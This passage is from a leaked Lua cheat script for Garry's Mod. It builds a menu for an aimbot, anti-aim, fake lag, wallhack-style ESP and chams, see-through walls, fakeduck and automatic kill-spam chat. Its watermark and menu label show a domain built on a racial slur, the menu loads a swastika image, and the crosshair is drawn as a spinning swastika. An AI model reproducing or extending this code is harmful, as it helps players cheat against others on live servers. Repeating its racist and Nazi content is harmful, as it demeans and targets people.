					me:ConCommand("say [Tacos] i just got owned by " .. attacker:Nick())
				end
			end
		end
	end
end

function nh.CreateMove(cmd)
	nh.AutoHop(cmd)-- Leak by Scora aka Scora Hub & White Bread
	nh.Aimbot(cmd)
	nh.AntiAim(cmd)
	nh.FakeLag(cmd)
	nh.HighJump(cmd)
end

function nh.AddHook(htype, name, func)
	hook.Add(htype, name, func)
	nh.Log("Created ", Color(255, 120, 5), htype, Color(255, 190, 5), " hook: ", Color(255, 120, 5), name, Color(255, 0, 0), " (" .. tostring(func) .. ")")
end

nh.curtab = 1
nh.menuitems = {}

function nh.CreateTab(frame, name, index, max)
	local tab = vgui.Create("DButton", frame)
	tab:SetText("")
	tab:SetSize(frame:GetWide() / max - 1, 30)
	tab:SetPos((index - 1) * (tab:GetWide() + 1), 24)
	function tab.Paint(self, width, height)
		surface.SetDrawColor(Color(0, 0, 0))-- Leak by Scora aka Scora Hub & White Bread
		surface.DrawRect(0, 0, width, height)
		if nh.curtab == index then
			surface.SetDrawColor(Color(30,144,255, 15))
			surface.DrawRect(0, 0, width, height)
		end

		draw.SimpleText(name, "gamer tab", width / 2, height / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	end

	function tab.DoClick()
		nh.curtab = index
		for i = 1, #nh.menuitems do
			local items = nh.menuitems[i]
			for k,v in next, items do
				v:SetVisible(i == index)
			end
		end
	end
end

function nh.CreateCheckbox(frame, name, tab, index, cvtab, cvname)-- Leak by Scora aka Scora Hub & White Bread
	local cvar = nh.vars[cvtab][cvname]
	local check = vgui.Create("DButton", frame)
	check:SetText("")
	surface.SetFont("gamer tab")
	local wid = surface.GetTextSize(name)
	check:SetSize(26 + wid, 18)
	local x = 10
	local y = 64 + (22 * (index - 1))
	if (y + 27) >= frame:GetTall() then
		local firstindex = 0
		for i = 1, index do
			local _y = 64 + (22 * (i - 1))
			if (_y + 27) >= frame:GetTall() then
				firstindex = i
				break
			end
		end

		x = (x * 2.5) + 192
		y = 64 + (22 * (index - (firstindex - 1) - 1))
	end-- Leak by Scora aka Scora Hub & White Bread

	check:SetPos(x, y)
	function check.Paint(self, width, height)
		surface.SetDrawColor(Color(30,144,255, 15))
		surface.DrawOutlinedRect(0, 0, 18, height)
		if cvar:GetBool() then
			surface.DrawRect(0, 0, 18, height)
		end

		draw.SimpleText(name, "gamer tab", 24, height / 2, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	end

	function check.DoClick()
		cvar:SetBool(!cvar:GetBool())
	end

	if nh.curtab != tab then
		check:SetVisible(false)
	end

	nh.menuitems[tab][#nh.menuitems[tab] + 1] = check
end

function nh.CreateSlider(frame, name, tab, index, cvtab, cvname, min, max, dec)-- Leak by Scora aka Scora Hub & White Bread
	min = min * 10
	max = max * 10
	local cvar = nh.vars[cvtab][cvname]
	local slider = vgui.Create("DButton", frame)
	slider:SetText("")
	slider:SetSize(192, 32)
	local x = 10
	local y = 64 + (22 * (index - 1))
	if (y + 27) >= frame:GetTall() then
		local firstindex = 0
		for i = 1, index do
			local _y = 64 + (22 * (i - 1))
			if (_y + 27) >= frame:GetTall() then
				firstindex = i
				break
			end
		end

		x = (x * 2.5) + 192
		y = 64 + (22 * (index - (firstindex - 1) - 1))
	end-- Leak by Scora aka Scora Hub & White Bread

	slider:SetPos(x, y)
	function slider.Paint(self, width, height)
		draw.SimpleText(name .. " [" .. math.Round(cvar:GetFloat(), dec) .. "]", "gamer tab", width / 2, height / 2 - (height / 4), Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		surface.SetDrawColor(Color(30,144,255, 15))
		surface.DrawRect(0, height / 1.25, width, 1)
		surface.DrawRect(math.Clamp(((cvar:GetFloat() * 10) - min) / (max - min) * width - 2, 0, width - 4), height / 1.25 - 4, 4, 8)
		if input.IsMouseDown(MOUSE_LEFT) then
			local fx, fy = frame:GetPos()
			local sx, sy = slider:GetPos()
			local rx = fx + sx
			local ry = fy + sy
			local ssx, ssy = slider:GetSize()
			local mx = gui.MouseX()
			local my = gui.MouseY()
			local rmx = mx - rx
			if ((mx >= rx) and ((rx + ssx) >= mx)) and ((my >= ry) and ((ry + ssy) >= my)) then
				cvar:SetFloat(math.Round(rmx / width * ((max / 10) - (min / 10)) + (min / 10), dec))
			end
		end
	end-- Leak by Scora aka Scora Hub & White Bread

	function slider.DoClick() end

	if nh.curtab != tab then
		slider:SetVisible(false)
	end

	nh.menuitems[tab][#nh.menuitems[tab] + 1] = slider
end

function nh.Menu()
	nh.menuitems = {{}, {}, {}, {}}
	local frame = vgui.Create("DFrame")
	frame:SetTitle("")
	frame:SetSize(800, 650)
	frame:SetPos(0, 0)
	frame:ShowCloseButton(false)
	frame:SetDraggable(false)
	frame:Center()
	local text = vgui.Create( "DLabel", frame )
    text:SetPos( 5, 630 )-- Leak by Scora aka Scora Hub & White Bread
    text:SetText( "kill-niggers.xyz | "..LocalPlayer():Name().." | "..os.date("%d.%m.%y", os.time()).." | ip: "..game.GetIPAddress().." | uptime: "..math.floor(CurTime()).." | tick: "..tostring(math.Round(1/engine.TickInterval()-1)) )
    text:SizeToContents()
	frame:MakePopup()
    local x, y = 535, 535      
    local img = vgui.Create("DImage", frame)
    img:SetPos(800-x, 650-y)
    img:SetSize(x, y)
    img:SetImage("data/swaston.png")
	function frame.Paint(self, width, height)
		surface.SetDrawColor(Color(0, 0, 0))
		surface.DrawRect(0, 0, width, height)
		draw.SimpleText("", "gamer title", width / 2, 12, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	end

	local close = vgui.Create("DButton", frame)
	close:SetText("X")
	close:SetSize(24, 24)
	close:SetPos(frame:GetWide() - 24, 0)-- Leak by Scora aka Scora Hub & White Bread
	function close.Paint(self, width, height)
		surface.SetDrawColor(Color(0, 0, 0))
		surface.DrawRect(0, 0, width, height)
	end

	function close.DoClick()
		frame:Remove()
	end

	//// TABS \\\\
	nh.CreateTab(frame, "ragebot", 1, 5)
	nh.CreateTab(frame, "visuals", 2, 5)
	nh.CreateTab(frame, "misc", 3, 5)
	nh.CreateTab(frame, "hvh", 4, 5)
	nh.CreateTab(frame, "lua", 5, 5)

	//// AIMBOT TAB \\\\
	nh.CreateCheckbox(frame, "enabled", 1, 1, "aimbot", "enabled")-- Leak by Scora aka Scora Hub & White Bread
	nh.CreateCheckbox(frame, "autowall", 1, 2, "aimbot", "autowall")
	nh.CreateCheckbox(frame, "silent", 1, 3, "aimbot", "silent")
	nh.CreateCheckbox(frame, "nospread", 1, 4, "aimbot", "nospread")
	nh.CreateCheckbox(frame, "bodyaim", 1, 5, "aimbot", "bodyaim")
	nh.CreateCheckbox(frame, "static aa", 1, 6, "aimbot", "static")
	nh.CreateCheckbox(frame, "nextshot", 1, 7, "aimbot", "nextshot")
	nh.CreateCheckbox(frame, "autoshoot", 1, 8, "aimbot", "autoshoot")
	nh.CreateCheckbox(frame, "ignore team", 1, 9, "aimbot", "team")
	nh.CreateCheckbox(frame, "ignore friends", 1, 10, "aimbot", "friends")

	//// VISUALS TAB \\\\
	nh.CreateCheckbox(frame, "enabled", 2, 1, "visuals", "esp")
	nh.CreateCheckbox(frame, "name", 2, 2, "visuals", "name")
	nh.CreateCheckbox(frame, "box", 2, 3, "visuals", "box")
	nh.CreateCheckbox(frame, "weapon", 2, 4, "visuals", "weapon")-- Leak by Scora aka Scora Hub & White Bread
	nh.CreateCheckbox(frame, "rank", 2, 5, "visuals", "rank")
	nh.CreateCheckbox(frame, "healthbar", 2, 6, "visuals", "health")
	nh.CreateSlider(frame, "fov", 2, 7, "visuals", "fov", 65, 125, 0)
	nh.CreateCheckbox(frame, "asus", 2, 9, "visuals", "asus")
	nh.CreateCheckbox(frame, "player chams", 2, 10, "visuals", "chams")
	nh.CreateCheckbox(frame, "weapon chams", 2, 11, "visuals", "wepchams")
	nh.CreateCheckbox(frame, "thirdperson", 2, 12, "misc", "thirdperson")
	nh.CreateSlider(frame, "rainbow viewmodel", 2, 13, "visuals", "viewmodel", 0, 1, 0)
	nh.CreateCheckbox(frame, "nightmode", 2, 15, "visuals", "nightmode")

	//// MISC TAB \\\\
	nh.CreateCheckbox(frame, "autohop", 3, 1, "misc", "autohop")-- Leak by Scora aka Scora Hub & White Bread
	nh.CreateCheckbox(frame, "highjump", 3, 2, "misc", "highjump")
	nh.CreateCheckbox(frame, "killspam", 3, 3, "misc", "killspam")
	nh.CreateCheckbox(frame, "killspam tts", 3, 4, "misc", "robo")
	nh.CreateCheckbox(frame, "autostrafe", 3, 5, "misc", "autostrafe")
	nh.CreateCheckbox(frame, "watermark", 3, 6, "misc", "watermark")
	nh.CreateCheckbox(frame, "trail", 3, 7, "misc", "trail")
	nh.CreateCheckbox(frame, "crosshair", 3, 8, "misc", "crosshair")
	nh.CreateCheckbox(frame, "bullettracers", 3, 9, "misc", "bt")
	nh.CreateCheckbox(frame, "hitsound", 3, 10, "misc", "hs")
	nh.CreateCheckbox(frame, "fakeduck", 3, 11, "misc", "fakeduck")

	//// HVH TAB \\\\
	nh.CreateCheckbox(frame, "antiaim", 4, 1, "hvh", "antiaim")
	nh.CreateCheckbox(frame, "edge antiaim", 4, 2, "hvh", "edge")
	nh.CreateSlider(frame, "edge method", 4, 3, "hvh", "edgemet", 1, 4, 0)
	nh.CreateCheckbox(frame, "adaptive antiaim", 4, 5, "hvh", "adaptive")
	nh.CreateSlider(frame, "adaptive yaw", 4, 6, "hvh", "adapyaw", 270, 540, 0)
	nh.CreateSlider(frame, "adaptive max", 4, 8, "hvh", "adapmax", 2, 30, 0)
	nh.CreateSlider(frame, "adaptive speed", 4, 10, "hvh", "adapspeed", 1, 15, 0)
	nh.CreateSlider(frame, "antiaim pitch", 4, 12, "hvh", "pitch", -250, 250, 0)
	nh.CreateSlider(frame, "antiaim yaw", 4, 14, "hvh", "yaw", 270, 541, 0)-- Leak by Scora aka Scora Hub & White Bread
	nh.CreateCheckbox(frame, "fakelag", 4, 16, "hvh", "fakelag")
	nh.CreateSlider(frame, "fakelag choke", 4, 17, "hvh", "flchoke", 2, 14, 0)
end

---------------------ASUS---------------------
function nh.RenderScene()
	for k,v in next, game.GetWorld():GetMaterials() do
		local mat = Material(v)
		if nh.vars["visuals"]["asus"]:GetBool() then
			mat:SetFloat("$alpha", 0.75)
		else
			mat:SetFloat("$alpha", 1)
		end
	end
end

function nh.PostDraw2DSkyBox(ent, pos)
	if nh.vars["visuals"]["asus"]:GetBool() then
		render.Clear(0, 0, 0, 0, true, true)
	end
end-- Leak by Scora aka Scora Hub & White Bread
---------------------ASUS---------------------
nh.wepchams = CreateMaterial("wireless_weapon_mat", "VertexLitGeneric", {
	["$ignorez"] = 1,
	["$model"] = 1,
	["$basetexture"] = "models/debug/debugwhite"
})

nh.chams1 = CreateMaterial("wireless_gamer_mat", "VertexLitGeneric", {
	["$ignorez"] = 1,
	["$model"] = 1,
	["$basetexture"] = "models/debug/debugwhite"
})

nh.chams2 = CreateMaterial("wired_gamer_mat", "VertexLitGeneric", {
	["$ignorez"] = 0,
	["$model"] = 1,
	["$basetexture"] = "models/debug/debugwhite"
})-- Leak by Scora aka Scora Hub & White Bread

function nh.GetWepChamsColor()
	return 255 / 255, 255 / 255, 255 / 255
end

function nh.GetChamsColor(t, v)
	if t then
		if v then
			return 50 / 255, 200 / 255, 25 / 255
		else
			return 0, 100 / 255, 255 / 255
		end	
	else
		if v then
			return 200 / 255, 125 / 255, 0-- Leak by Scora aka Scora Hub & White Bread
		else
			return 200 / 255, 225 / 255, 0
		end
	end
end

function nh.Chams()
	for k,v in next, ents.GetAll() do
		if !nh.vars["visuals"]["wepchams"]:GetBool() or !v:IsValid() or !v:IsWeapon() then continue end
		cam.Start3D()
		render.MaterialOverride(nh.wepchams)
		render.SetColorModulation(nh.GetWepChamsColor(false))
		v:DrawModel()
		cam.End3D()
	end-- Leak by Scora aka Scora Hub & White Bread

	for k,v in next, player.GetAll() do
		if !nh.vars["visuals"]["chams"]:GetBool() or !v:IsValid() or !v:IsPlayer() or !v:Alive() or 0 >= v:Health() then continue end
		if !nh.vars["misc"]["thirdperson"]:GetBool() and v == me then continue end
		cam.Start3D()
		render.MaterialOverride(nh.chams1)
		render.SetColorModulation(nh.GetChamsColor(me:Team() == v:Team(), false))
		v:DrawModel()
		if v == me then
			render.SetColorModulation(nh.GetChamsColor(me:Team() == v:Team(), false))
		else
			render.SetColorModulation(nh.GetChamsColor(me:Team() == v:Team(), true))
		end

		render.MaterialOverride(nh.chams2)
		v:DrawModel()
		cam.End3D()
	end-- Leak by Scora aka Scora Hub & White Bread
end
----------------------------------------------
local mat0 = Material("models/debug/debugwhite")
local mat1 = Material("models/shiny")
nh.PreDrawViewModel = function()
	local viewmodel = nh.vars["visuals"]["viewmodel"]:GetInt()
	if 0 >= viewmodel then return end
    render.SuppressEngineLighting(true)
    local col = HSVToColor(  ( CurTime() * 100 ) % 360, 1, 1 )
    local r,g,b=col.r/255,col.g/255,col.b/255
    render.SetColorModulation(r,g,b)
    render.MaterialOverride(Material(""))
    render.SetBlend(1)
end
nh.PostDrawViewModel = function()
	local viewmodel = nh.vars["visuals"]["viewmodel"]:GetInt()
	if 0 >= viewmodel then return end
    local col = HSVToColor(  ( CurTime() * 100 ) % 360, 1, 1 )-- Leak by Scora aka Scora Hub & White Bread
    local r,g,b=col.r/255,col.g/255,col.b/255
    render.SetColorModulation(r,g,b)
    render.MaterialOverride(Material(""))
    render.SetBlend(1)
    render.SuppressEngineLighting(false)
end
 
nh.PreDrawPlayerHands = function()
	local viewmodel = nh.vars["visuals"]["viewmodel"]:GetInt()
	if 0 >= viewmodel then return end
    local col = HSVToColor(  ( CurTime() * 100 ) % 360, 1, 1 )
    local r,g,b=col.r/255,col.g/255,col.b/255
    render.SetColorModulation(r,g,b)
    render.MaterialOverride(mat1)
    render.SetBlend(1)-- Leak by Scora aka Scora Hub & White Bread
end
nh.PostDrawPlayerHands = function()
	local viewmodel = nh.vars["visuals"]["viewmodel"]:GetInt()
	if 0 >= viewmodel then return end
    local col = HSVToColor(  ( CurTime() * 100 ) % 360, 1, 1 )
    local r,g,b=col.r/255,col.g/255,col.b/255
    render.SetColorModulation(r,g,b)
    render.MaterialOverride(Material(""))
    render.SetBlend(1)
end
---------------------ASUS---------------------
local mat0 = Material("models/debug/debugwhite")
local mat1 = Material("models/shiny")
nh.PreDrawViewModel = function()
	local viewmodel = nh.vars["visuals"]["viewmodel"]:GetInt()-- Leak by Scora aka Scora Hub & White Bread
	if 0 >= viewmodel then return end
    render.SuppressEngineLighting(true)
    local col = HSVToColor(  ( CurTime() * 100 ) % 360, 1, 1 )
    local r,g,b=col.r/255,col.g/255,col.b/255
    render.SetColorModulation(r,g,b)
    render.MaterialOverride(Material(""))
    render.SetBlend(1)
end
nh.PostDrawViewModel = function()
	local viewmodel = nh.vars["visuals"]["viewmodel"]:GetInt()
	if 0 >= viewmodel then return end
    local col = HSVToColor(  ( CurTime() * 100 ) % 360, 1, 1 )
    local r,g,b=col.r/255,col.g/255,col.b/255
    render.SetColorModulation(r,g,b)
    render.MaterialOverride(Material(""))
    render.SetBlend(1)
    render.SuppressEngineLighting(false)
end-- Leak by Scora aka Scora Hub & White Bread
 
nh.PreDrawPlayerHands = function()
	local viewmodel = nh.vars["visuals"]["viewmodel"]:GetInt()
	if 0 >= viewmodel then return end
    local col = HSVToColor(  ( CurTime() * 100 ) % 360, 1, 1 )
    local r,g,b=col.r/255,col.g/255,col.b/255
    render.SetColorModulation(r,g,b)
    render.MaterialOverride(mat1)
    render.SetBlend(1)
end
nh.PostDrawPlayerHands = function()
	local viewmodel = nh.vars["visuals"]["viewmodel"]:GetInt()
	if 0 >= viewmodel then return end
    local col = HSVToColor(  ( CurTime() * 100 ) % 360, 1, 1 )
    local r,g,b=col.r/255,col.g/255,col.b/255-- Leak by Scora aka Scora Hub & White Bread
    render.SetColorModulation(r,g,b)
    render.MaterialOverride(Material(""))
    render.SetBlend(1)
end
---------------------ASUS---------------------
local trailpos = {}
hook.Add("HUDPaint","boobs",function()
	if nh.vars["misc"]["trail"]:GetBool() then
		local hsv = HSVToColor( ( CurTime() * 50 ) % 360, 1, 1 )
		surface.SetDrawColor(hsv.r,hsv.g,hsv.b)
		for i = 1, #trailpos-1 do
			local pos = trailpos[i]:ToScreen()
			local prevpos = trailpos[i+1]:ToScreen()
			--surface.DrawRect(pos.x,pos.y,4,4)
			surface.DrawLine(pos.x,pos.y,prevpos.x,prevpos.y)
		end
	end	
	trailpos[#trailpos+1] = LocalPlayer():GetPos()-- Leak by Scora aka Scora Hub & White Bread
	if #trailpos > 100 then
		table.remove(trailpos,1)
	end
end)

---------------------ASUS---------------------
hook.Add("HUDPaint","watermark",function()
    if nh.vars["misc"]["watermark"]:GetBool() then
    local sSF = surface.SetFont
	local sSDC = surface.SetDrawColor
	local sGTS = surface.GetTextSize
	local sDTE = surface.DrawTexturedRect
	sSF("gamer tab")
		    local textwi = sGTS("kill-niggers.xyz " .. "| username: " .. LocalPlayer():Name() .. " | gm: " .. engine.ActiveGamemode() .. " | latency:" .. LocalPlayer():Ping() .. " | tick:"..math.Round(1/engine.TickInterval()-1) )
			local textwid = textwi + 5
			local rgbcol = HSVToColor( ( CurTime() * 50 ) % 360, 1, 1 )
		    draw.RoundedBox( 3, 5, 5, textwid, 25, Color(25,25,25))
			draw.RoundedBox( 10, 7, 6, textwid-4, 3, Color(rgbcol.r,rgbcol.g,rgbcol.b))-- Leak by Scora aka Scora Hub & White Bread
		    sSDC( 255, 255, 255, 60 ) 
	        surface.SetMaterial(Material("gui/center_gradient")) 
	        sDTE(7, 6, textwid-4, 3)
            draw.SimpleText( "kill-niggers.xyz " .. "| username: " .. LocalPlayer():Name() .. " | gm: " .. engine.ActiveGamemode() .. " | latency:" .. LocalPlayer():Ping() .. " | tick:"..math.Round(1/engine.TickInterval()-1) , "gamer tab", 8, 10, color_white )
        end
		end)
----------------------------------------------
local sSDC = surface.SetDrawColor
local sDL = surface.DrawLine
local function DEG2RAD(x) return x * math.pi / 180 end
local function RAD2DEG(x) return x * 180 / math.pi end
-- Leak by Scora aka Scora Hub & White Bread
local rainbow = 0.00
local rotationdegree = 0.000;

local function hsv2rgb(h, s, v, a)
    local r, g, b
 
    local i = math.floor(h * 6);
    local f = h * 6 - i;
    local p = v * (1 - s);
    local q = v * (1 - f * s);
    local t = v * (1 - (1 - f) * s);
 
    i = i % 6
 
    if i == 0 then r, g, b = v, t, p-- Leak by Scora aka Scora Hub & White Bread
    elseif i == 1 then r, g, b = q, v, p
    elseif i == 2 then r, g, b = p, v, t
    elseif i == 3 then r, g, b = p, q, v
    elseif i == 4 then r, g, b = t, p, v
    elseif i == 5 then r, g, b = v, p, q
    end
 
    return r * 255, g * 255, b * 255, a * 255
end

local function draw_svaston(x, y, size)
    local frametime = FrameTime()
    local a = size / 60
    local gamma = math.atan(a / a)
    rainbow = rainbow + (frametime * 0.5)-- Leak by Scora aka Scora Hub & White Bread
    if rainbow > 1.0 then rainbow = 0.0 end
    if rotationdegree > 89 then rotationdegree = 0 end

    for i = 0, 4 do 
        local p_0 = (a * math.sin(DEG2RAD(rotationdegree + (i * 90))))
        local p_1 = (a * math.cos(DEG2RAD(rotationdegree + (i * 90))))
        local p_2 =((a / math.cos(gamma)) * math.sin(DEG2RAD(rotationdegree + (i * 90) + RAD2DEG(gamma))))
        local p_3 =((a / math.cos(gamma)) * math.cos(DEG2RAD(rotationdegree + (i * 90) + RAD2DEG(gamma))))

        sSDC(hsv2rgb(rainbow,1, 1, 1))
        sDL(x, y, x + p_0, y - p_1)
        sDL(x + p_0, y - p_1, x + p_2, y - p_3)-- Leak by Scora aka Scora Hub & White Bread
    end
    rotationdegree = rotationdegree + (frametime * 150)
end

nh.ziga = function()
if nh.vars["misc"]["crosshair"]:GetBool() then
    local screenW, screenH = ScrW() ,ScrH()
    draw_svaston(screenW / 2, screenH / 2, screenH /2)
	end
end
----------------------------------------------
tracerTable = {}
hitmarkerTable = {}

me = LocalPlayer()-- Leak by Scora aka Scora Hub & White Bread

CreateClientConVar("n_tracer", "cable/hydra", true, false)

local lamarr_tracer = GetConVar("n_tracer")

hook.Add("PreDrawOpaqueRenderables", "DrawTracerBeam", function ()
        if nh.vars["misc"]["bt"]:GetBool() then
        for k,v in next, tracerTable do
        if(v[3] <= 0) then
            table.remove(tracerTable, k);
            continue;
        end
        tracerTable[k][3] = tracerTable[k][3] - FrameTime();
        local pos1, pos2 = v[1], v[2];
        cam.Start3D();-- Leak by Scora aka Scora Hub & White Bread
        render.SetMaterial(Material( lamarr_tracer:GetString() ))
        render.DrawBeam(v[1], v[2], 4, 1, 1, v[4])
        cam.End3D();-- Leak by Scora aka Scora Hub & White Bread
    end-- Leak by Scora aka Scora Hub & White Bread
end-- Leak by Scora aka Scora Hub & White Bread

hook.Add("HUDPaint", "DrawTracer",function ()
    if nh.vars["misc"]["bt"]:GetBool() then
    for k, v in next, hitmarkerTable do
        local pos = v[1]:ToScreen()

        if(v[2] <= 0) then
            table.remove(hitmarkerTable, k);
            continue;
        end
        v[2] = v[2] - FrameTime()
        surface.SetDrawColor(255, 255,255)
        surface.DrawLine( pos.x - 8, pos.y - 8, pos.x - 2, pos.y - 2 )-- Leak by Scora aka Scora Hub & White Bread
        surface.DrawLine( pos.x - 8, pos.y + 8, pos.x - 2, pos.y + 2 )-- Leak by Scora aka Scora Hub & White Bread
        surface.DrawLine( pos.x + 8, pos.y - 8, pos.x + 2, pos.y - 2 )-- Leak by Scora aka Scora Hub & White Bread
        surface.DrawLine( pos.x + 8, pos.y + 8, pos.x + 2, pos.y + 2 )-- Leak by Scora aka Scora Hub & White Bread
    end-- Leak by Scora aka Scora Hub & White Bread
end-- Leak by Scora aka Scora Hub & White Bread

hook.Add("PlayerTraceAttack", "BulletTracer", function (ent, dmg, dir, trace)-- Leak by Scora aka Scora Hub & White Bread
    if nh.vars["misc"]["bt"]:GetBool() then-- Leak by Scora aka Scora Hub & White Bread
    if(!IsFirstTimePredicted()) then return; end-- Leak by Scora aka Scora Hub & White Bread
-- Leak by Scora aka Scora Hub & White Bread
    local vHitPos, vSrc;-- Leak by Scora aka Scora Hub & White Bread
    vHitPos = trace.HitPos;-- Leak by Scora aka Scora Hub & White Bread
    vSrc = trace.StartPos;-- Leak by Scora aka Scora Hub & White Bread
-- Leak by Scora aka Scora Hub & White Bread
    table.insert(tracerTable, {vHitPos, vSrc, 5, Color(0, 255, 0), me:EyeAngles()});-- Leak by Scora aka Scora Hub & White Bread
    table.insert(hitmarkerTable, {vHitPos, 1})-- Leak by Scora aka Scora Hub & White Bread
end
------------------------------------------------------ Leak by Scora aka Scora Hub & White Bread
end)-- Leak by Scora aka Scora Hub & White Bread
end)-- Leak by Scora aka Scora Hub & White Bread
end)-- Leak by Scora aka Scora Hub & White Bread
---------------------ASUS----------------------- Leak by Scora aka Scora Hub & White Bread
gameevent.Listen("player_hurt")
hook.Add("player_hurt", "Hitmarker", function (data)-- Leak by Scora aka Scora Hub & White Bread
if nh.vars["misc"]["hs"]:GetBool() then-- Leak by Scora aka Scora Hub & White Bread
    if(data.attacker != me:UserID()) then return end-- Leak by Scora aka Scora Hub & White Bread
    sound.PlayURL("https://cdn.discordapp.com/attachments/1005213673733771374/1009543718107353119/hitmarker.wav", "", function() end)-- Leak by Scora aka Scora Hub & White Bread
end
end)
----------------------------------------------
hook.Add("RenderScene", "nh_night", function(origin, angle, fov)-- Leak by Scora aka Scora Hub & White Bread
        if nh.vars["visuals"]["nightmode"]:GetBool() then-- Leak by Scora aka Scora Hub & White Bread
		for k, v in pairs(game.GetWorld():GetMaterials()) do-- Leak by Scora aka Scora Hub & White Bread
		Material(v):SetVector("$color", Vector(0.05, 0.05, 0.05))-- Leak by Scora aka Scora Hub & White Bread
		end
		render.SuppressEngineLighting(true)-- Leak by Scora aka Scora Hub & White Bread
		render.ResetModelLighting(0.2, 0.2, 0.2)
		else-- Leak by Scora aka Scora Hub & White Bread
		for k, v in pairs(game.GetWorld():GetMaterials()) do-- Leak by Scora aka Scora Hub & White Bread
		Material(v):SetVector("$color", Vector(1, 1, 1))
		end-- Leak by Scora aka Scora Hub & White Bread
		render.SuppressEngineLighting(false)
		render.ResetModelLighting(1, 1, 1)
	end
end)
------------------------------------------------ Leak by Scora aka Scora Hub & White Bread
local FakeDuckCmd = CreateClientConVar("fakeduck",0)-- Leak by Scora aka Scora Hub & White Bread
hook.Add("Tick","FakeDuck",function()-- Leak by Scora aka Scora Hub & White Bread
    if nh.vars["misc"]["fakeduck"]:GetBool() then-- Leak by Scora aka Scora Hub & White Bread
    if(input.IsKeyDown(KEY_LALT)) then-- Leak by Scora aka Scora Hub & White Bread
        isFakeDucking = true-- Leak by Scora aka Scora Hub & White Bread
        if(GetConVar("fakeduck"):GetInt() == 1) then-- Leak by Scora aka Scora Hub & White Bread
            if(LocalPlayer():GetCurrentViewOffset().z >= 28 + FrameTime()) then-- Leak by Scora aka Scora Hub & White Bread
                RunConsoleCommand("+duck")-- Leak by Scora aka Scora Hub & White Bread
            elseif(LocalPlayer():GetCurrentViewOffset().z <= 28) then-- Leak by Scora aka Scora Hub & White Bread
                RunConsoleCommand("-duck")
            end-- Leak by Scora aka Scora Hub & White Bread
        else-- Leak by Scora aka Scora Hub & White Bread
            if(isFakeDucking) then
                RunConsoleCommand("-duck")-- Leak by Scora aka Scora Hub & White Bread
            end
        end
    else
        if(isFakeDucking) then
            RunConsoleCommand("-duck")
            isFakeDucking = false-- Leak by Scora aka Scora Hub & White Bread
        end
        isFakeDucking = false
    end
end
end)
----------------------------------------------
------------------------------------------------ Leak by Scora aka Scora Hub & White Bread
nh.AddHook("Think", "nh.GetTarget", nh.GetTarget)-- Leak by Scora aka Scora Hub & White Bread
nh.AddHook("DrawOverlay", "nh.ziga", nh.ziga)-- Leak by Scora aka Scora Hub & White Bread
nh.AddHook("RenderScene", "nh.RenderScene", nh.RenderScene, "nh.night", nh.night)-- Leak by Scora aka Scora Hub & White Bread
nh.AddHook("RenderScreenspaceEffects", "nh.Chams", nh.Chams)
nh.AddHook("PreDrawViewModel", "nh.PreDrawViewModel", nh.PreDrawViewModel)
nh.AddHook("PostDrawViewModel", "nh.PostDrawViewModel", nh.PostDrawViewModel)-- Leak by Scora aka Scora Hub & White Bread
nh.AddHook("PostDraw2DSkyBox", "nh.PostDraw2DSkyBox", nh.PostDraw2DSkyBox)
nh.AddHook("Move", "nh.GetCurTime", nh.GetCurTime)-- Leak by Scora aka Scora Hub & White Bread-- Leak by Scora aka Scora Hub & White Bread
nh.AddHook("HUDPaint", "nh.Visuals", nh.Visuals)
nh.AddHook("CreateMove", "nh.CreateMove", nh.CreateMove)-- Leak by Scora aka Scora Hub & White Bread
nh.AddHook("CalcView", "nh.CalcView", nh.CalcView)
nh.AddHook("ShouldDrawLocalPlayer", "nh.ShouldDrawLocalPlayer", nh.ShouldDrawLocalPlayer)-- Leak by Scora aka Scora Hub & White Bread
nh.AddHook("PreDrawOpaqueRenderables", "nh.PreDrawOpaqueRenderables", nh.PreDrawOpaqueRenderables)
gameevent.Listen("player_hurt")-- Leak by Scora aka Scora Hub & White Bread
nh.AddHook("player_hurt", "nh.PlayerHurt", nh.PlayerHurt)
concommand.Add("nh_menu", nh.Menu)-- Leak by Scora aka Scora Hub & White Bread
nh.Log("Created concommand: ", Color(255, 120, 5), "nh_menu", Color(255, 0, 0), " (" .. tostring(nh.Menu) .. ")")-- Leak by Scora aka Scora Hub & White Bread
concommand.Add("nh_resetcv", nh.ResetConsoleVars)-- Leak by Scora aka Scora Hub & White Bread
nh.Log("Created concommand: ", Color(255, 120, 5), "nh_resetcv", Color(255, 0, 0), " (" .. tostring(nh.ResetConsoleVars) .. ")")-- Leak by Scora aka Scora Hub & White Bread
nh.Log("Loaded!")-- Leak by Scora aka Scora Hub & White Bread